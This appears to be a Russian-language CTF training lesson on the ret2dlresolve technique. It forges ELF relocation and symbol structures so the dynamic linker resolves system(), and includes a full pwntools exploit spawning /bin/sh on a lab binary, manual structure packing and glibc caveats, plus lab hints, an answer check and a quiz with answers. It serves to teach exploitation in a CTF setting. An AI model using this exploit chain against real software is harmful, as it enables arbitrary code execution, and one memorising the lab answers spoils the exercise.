---
id: pwn-ret2dlresolve
title: "ret2dlresolve: вызов функций без утечки libc"
category: pwn
parent: pwn-mitigations-bypass
difficulty: hard
order: 3
tags: [ret2dlresolve, dynamic-linker, pwntools, no-leak]
prerequisites: [pwn-mitigations, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Эксплуатация без утечек"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Учимся заставлять динамический линкер резолвить произвольный символ (system) без знания libc — через подделку структур .rela.plt, .dynstr и symtab."
lab:
  kind: shell
  title: "Практика: релокации .rela.plt"
  toolset: [core, readelf]
  workdir: /home/student/task
  files: [task.md, ret2dl]
  check: "grep -q '0x404008' answer.txt"
  hints:
    - "Это динамически слинкованный ELF: `file ret2dl`."
    - "Таблица релокаций: `readelf -r ret2dl` (секция `.rela.plt`)."
    - "Строка для `read` имеет тип `R_X86_64_JUMP_SLOT`; первый столбец — это `r_offset`."
---

## Вопрос, с которого всё начинается

Ты собрал ROP, но упёрся в стену: в бинаре нет ни `system` в PLT, ни гаджета `syscall`, ни возможности утечь libc. Казалось бы, тупик — нечем вызвать функцию.

Но в бинаре есть `read` и записываемая `.bss`. Оказывается, этого достаточно, чтобы заставить **динамический линкер** сам найти и вызвать `system`. Техника называется **ret2dlresolve**.

## Наш пример: бинарь без нужных символов

```bash
$ checksec --file=./chall
    RELRO:    Partial RELRO
    NX:       NX enabled
    PIE:      No PIE (0x400000)
$ objdump -d -j .plt ./chall | grep -E "system|read"
0000000000401030 <read@plt>:
```

`system` в PLT нет, `syscall` — тоже. Есть `read` и записываемая `.bss`.

## Шаг 1. Идея: линкер работает на нас

Мы уже видели ленивое связывание в уроке про GOT/PLT: при первом вызове PLT передаёт управление резолверу `_dl_runtime_resolve`, который по **индексу символа** находит адрес в libc и записывает в GOT.

Индекс — это смещение в таблице релокаций `.rela.plt`. Если подделать структуру релокации и подсунуть резолверу свой индекс, он разрешит **произвольное имя** — например, `system`. Для этого нужны:

- запись в известное место (обычно `.bss`) — через `read`;
- вызов PLT0 (`plt[0]`) — вход в резолвер.

## Шаг 2. Какие структуры подделываются

- `Elf64_Rela` — описывает релокацию: `r_offset` (куда писать), `r_info` (индекс символа + тип), `r_addend`.
- `Elf64_Sym` — описывает символ: `st_name` (смещение имени в строковой таблице), `st_info`, `st_value` и др.
- Строковая таблица — массив байтов с именем функции (`"system\x00"`).

| Структура | Размер | Поля |
|---|---|---|
| `Elf64_Rela` | 24 | offset(8), info(8), addend(8) |
| `Elf64_Sym` | 24 | name(4), info(1), other(1), shndx(2), value(8), size(8) |

Подделанные структуры кладут в `.bss` через `read`; `r_info` указывает на наш `Elf64_Sym`, чей `st_name` ссылается на строку `"system"`. Резолвер находит символ и прыгает туда.

## Шаг 3. Как линкер ищет символ

Разберём, что делает `_dl_runtime_resolve`. PLT0 — первая запись PLT; её код пушит `link_map` и индекс, затем прыгает в резолвер. Резолвер берёт `link_map`, находит таблицу символов (`symtab`) и строк (`strtab`), по индексу `r_info >> 32` достаёт `Elf64_Sym`, по `st_name` — строку имени. Затем ищет это имя в библиотеках и, найдя, записывает адрес в `GOT[r_offset]` и прыгает туда.

Наша атака подсовывает такие `symtab`/`strtab`/`Elf64_Sym`, что они указывают на нашу строку `"system"`. Резолвер доверяет структурам — и «разрешает» наш символ.

## Шаг 4. Автоматизация через Ret2dlresolvePayload

Собирать структуры вручную трудоёмко; pwntools делает всё сам:

```python
from pwn import *
context.binary = elf = ELF('./chall')
rop = ROP(elf)

dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)     # читаем наши поддельные структуры в .bss
rop.ret2dlresolve(dlresolve)         # вызываем резолвер
raw_rop = rop.chain()
```

`dlresolve.data_addr` — адрес в `.bss`, куда надо записать структуры (`dlresolve.payload`). `rop.ret2dlresolve` добавляет вызов PLT0 с нужным индексом.

## Шаг 5. Полный эксплойт

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET = 72

p = process('./chall')
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
rop.read(0, dlresolve.data_addr)          # stage: залить структуры
rop.ret2dlresolve(dlresolve)              # вызов резолвера -> system('/bin/sh')
p.sendline(flat({OFFSET: rop.chain()}))
p.send(dlresolve.payload)                 # сами структуры
p.interactive()
```

```text
[*] Switching to interactive mode
$ id
uid=1000(user) gid=1000(user)
```

Ключевые шаги: цепочка вызывает `read(0, bss, n)`, чтобы записать структуры; затем `ret2dlresolve` настраивает регистры и прыгает в PLT0; резолвер находит `system` и вызывает её с аргументом `/bin/sh`.

## Шаг 6. Ручная сборка (для понимания)

Без pwntools структуры собирают вручную. Формулы:

- `sym_index = (fake_sym_addr - real_symtab) // 24` — индекс символа (`Elf64_Sym` = 24 байта).
- `r_info = (sym_index << 32) | 7` — тип `R_X86_64_JUMP_SLOT` (7) для PLT.
- `st_name = fake_str - real_strtab` — смещение имени в строковой таблице.
- `r_offset` — адрес в writable-памяти, куда резолвер запишет найденный адрес.

```python
sym  = p32(str_off) + p8(0x12) + p8(0) + p16(0) + p64(0) + p64(0)
rela = p64(bss + 0x300) + p64((sym_off // 0x18) << 32 | 7) + p64(0)
```

`Ret2dlresolvePayload` делает эти вычисления за тебя; вручную они нужны лишь для понимания.

## Разбор вывода резолвера в gdb

Полезно увидеть, как резолвер работает «вживую». Поставь брейкпоинт на PLT0 и на `_dl_runtime_resolve`, запусти программу и вызови любую libc-функцию:

```text
(gdb) b *0x401020          # PLT0
(gdb) run
(gdb) x/2gx $rsp           # link_map и индекс
(gdb) info symbol $rdi
```

Ты увидишь, что PLT0 кладёт на стек `link_map` и индекс символа. Именно эти два значения резолвер использует для поиска. Подделав индекс (через наш ROP-вызов PLT0 с нужным стеком), мы заставляем его искать другой символ. `rop.ret2dlresolve` формирует стек так, чтобы PLT0 получил адрес нашего подделанного окружения. Это тонкая механика, но понимание помогает, когда автоматика не срабатывает на нестандартной glibc.

## Шаг 7. Условия и ограничения

| Условие | Почему нужно |
|---|---|
| контролируемый `read` | залить структуры в bss |
| известен адрес bss | куда писать |
| вызов PLT0 доступен | вход в резолвер |
| гаджеты для rdi/rsi/rdx | аргументы `read` |
| writable `.dynamic`/bss | резолвер пишет в GOT |

Если нет гаджетов для аргументов `read`, комбинируй с ret2csu (`pwn-ret2csu`).

## Шаг 8. Когда не сработает

| Причина | Следствие |
|---|---|
| Full RELRO | `.dynamic`/GOT read-only, резолвер не запишет |
| glibc 2.36+ | переработан `_dl_runtime_resolve`, часть эксплойтов ломается |
| нет `read` | нечем залить структуры |
| нет `plt0` | некуда вернуться |
| seccomp | резолвер использует `mprotect`/`mmap`, может быть запрещён |

В этих случаях переходи к SROP (`pwn-seccomp-srop`), FSOP (`pwn-fsop`) или перезаписи `.fini_array` (`pwn-fini-init-array`).

## На что смотреть дальше

- **Индекс символа кратен 24** — `Elf64_Sym` занимает 24 байта.
- **`r_offset` должен указывать в writable-память**, иначе резолвер упадёт.
- **При PIE нужна утечка базы** — адреса `read` и `.bss` неизвестны.
- **Версия glibc меняет резолвер** — проверяй цель.
- **Выравнивание стека** — при `movaps`-креше добавь `ret`.
- **Размер payload** — структуры плюс имя могут быть длинными.

## Инструмент: readelf — разбор ELF

`readelf` читает заголовки ELF-файла: архитектуру, тип, секции, сегменты и включённые защиты. С него начинается любой разбор нативного бинарника.

Ключи, которые пригодятся:
* `readelf -h <файл>` — заголовок: класс (32/64), машина, точка входа;
* `readelf -S <файл>` — таблица секций (`.text`, `.plt`, `.got`, `.data`);
* `readelf -s <файл>` — таблица символов (как `nm`, но с секциями и типами);
* `readelf -l <файл>` — сегменты программы; ищи `GNU_STACK`/`GNU_RELRO`, чтобы понять защиты.

### Рабочий пример (как в лаборатории)

```
$ readelf -r ret2dl

Relocation section '.rela.dyn' at offset 0x520 contains 4 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000403fc8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000403fd0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000403fd8  000500000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000403fe0  000600000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0

Relocation section '.rela.plt' at offset 0x580 contains 2 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000404000  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
000000404008  000400000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
```

Подсказка из лаборатории: `readelf [-r|-h|-d] <файл> — разбор ELF`.

## Что мы теперь знаем

- ret2dlresolve заставляет линкер разрешить произвольный символ без знания libc.
- Подделываются `Elf64_Rela`, `Elf64_Sym` и строка имени в `.bss`.
- PLT0 передаёт управление `_dl_runtime_resolve`.
- `Ret2dlresolvePayload` автоматизирует сборку и цепочку.
- Нужны `read`, writable `.bss` и Partial RELRO.

## Справочник: поведение резолвера по версиям glibc

`ret2dlresolve` зависит от внутреннего устройства динамического линкера, а оно менялось от версии к версии. Полезно знать, чего ждать:

| Версия glibc | Особенность резолвера | Влияние на эксплойт |
|---|---|---|
| ≤ 2.31 | `_dl_runtime_resolve` простой | классический ret2dlresolve работает |
| 2.32–2.33 | появились проверки `l_info` | нужны корректные `.dynamic`-записи |
| 2.34 | символы убраны из `libc.so` | отдельные `libc`-гаджеты искать сложнее |
| 2.35+ | усиленная валидация `link_map` | подделка окружения часто требует реальных полей |

Отсюда практический вывод: **один и тот же скрипт на разных glibc ведёт себя по-разному**. Всегда проверяй версию цели (`ldd --version` или строка в libc) и, если автоматика pwntools падает, читай `_dl_runtime_resolve` в дизассемблере именно этой версии.

## Ограничения метода

- **Full RELRO закрывает путь.** При полном RELRO `.dynamic` и GOT доступны только для чтения — резолверу некуда писать, и приём не работает.
- **Нужен контролируемый `read`.** Структуры (fake `Elf64_Sym`, `Elf64_Rela`, строку имени) надо куда-то залить; без записи в writable-память цепочка не соберётся.
- **Нужны гаджеты для аргументов `read`.** `rdi`/`rsi`/`rdx` выставляются гаджетами; если их нет — комбинируй с ret2csu.
- **Адрес bss должен быть известен.** В PIE-бинаре его сначала надо утечь — иначе писать некуда.
- **Резолвер перезаписывает GOT.** Повторный вызов того же PLT-слота после подмены вернёт уже подделанный адрес — учитывай при построении многоступенчатых цепочек.

## Квиз

Проверь себя.

```quiz
- question: "Что делает ret2dlresolve?"
  options:
    - "Заставляет линкер разрешить произвольный символ без знания libc"
    - "Отключает ASLR"
    - "Заполняет tcache"
    - "Снимает canary"
  answer: 0
  explanation: "Подделка .rela.plt/.dynstr/sym заставляет _dl_runtime_resolve вызвать system."
- question: "Какая функция линкера выполняет резолв при первом вызове PLT?"
  options:
    - "_dl_runtime_resolve"
    - "main"
    - "printf"
    - "_start"
  answer: 0
  explanation: "PLT[0] ведёт в _dl_runtime_resolve, который разрешает символ по индексу."
- question: "Какой тип релокации используется для PLT-записи на x86-64?"
  options:
    - "R_X86_64_JUMP_SLOT (7)"
    - "R_X86_64_NONE"
    - "R_X86_64_64"
    - "R_X86_64_GLOB_DAT"
  answer: 0
  explanation: "PLT-вызовы используют R_X86_64_JUMP_SLOT."
- question: "Что нужно, чтобы разместить fake-структуры?"
  options:
    - "Возможность записи в .bss (например, через read)"
    - "Только утечка canary"
    - "Отключённый NX"
    - "Только PIE"
  answer: 0
  explanation: "Структуры пишутся в rw-память (.bss) перед вызовом резолвера."
- question: "Какая pwntools-функция автоматизирует ret2dlresolve?"
  options:
    - "Ret2dlresolvePayload"
    - "shellcraft"
    - "cyclic"
    - "fmtstr_payload"
  answer: 0
  explanation: "Ret2dlresolvePayload строит fake-структуры и цепочку."
```

## Куда дальше

В `pwn-cet-cfi` мы разберём ещё более современную защиту — Control-flow Enforcement Technology, ломающую классический ROP. А пока главное: **ret2dlresolve — оружие последнего рубежа: наличие `read` и writable `.bss` превращается в вызов произвольной функции libc.**

## Где пригодится

- **CTF:** Pwn — задачи без утечки libc.
- **Bug bounty:** построение цепочек в сложных условиях.
- **Пентест:** разработка эксплойтов.
- **Работа:** exploit development.
